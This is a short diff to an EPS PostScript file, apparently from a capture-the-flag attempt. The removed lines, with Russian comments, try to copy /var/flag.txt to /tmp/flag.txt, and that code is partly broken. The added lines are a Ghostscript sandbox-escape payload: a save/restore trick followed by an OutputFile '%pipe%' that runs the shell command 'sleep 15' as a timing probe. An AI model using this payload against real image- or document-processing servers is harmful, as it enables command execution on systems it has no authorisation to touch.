@@ -1,20 +1,8 @@
 %!PS-Adobe-2.0 EPSF-1.2
-/outf (/tmp/flag.txt) (w) file def
-/flagfile (/var/flag.txt) (r) file def
-
-% Читаем содержимое /var/flag.txt и записываем в /tmp/flag.txt
-{
-    /line flagfile readline pop
-    outf (line) writestring
-    outf (\\n) writestring
-    /line flagfile readline pop
-} {
-    % Если достигнут конец файла, закрываем файл
-    outf closefile
-    % Завершаем выполнение
-    showpage
-    quit
-} loop
-
-% Закрываем файлы
-flagfile closefile
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%sleep 15) currentdevice putdeviceprops
